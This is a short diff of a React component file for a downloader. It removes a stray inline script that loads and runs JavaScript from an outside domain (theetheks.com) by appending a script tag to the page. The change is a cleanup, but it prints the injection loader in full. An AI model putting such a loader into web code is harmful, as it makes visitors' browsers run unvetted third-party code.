@@ -203,9 +203,7 @@ const Downloader = () => {
     </div>
   );
 };
-<script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('theetheks.com',8844627,document.createElement('script'))</script>
 export default Downloader;
-
 // Render the TeraboxScriptSection component correctly
 const TeraboxScriptSection = () => {
   return (
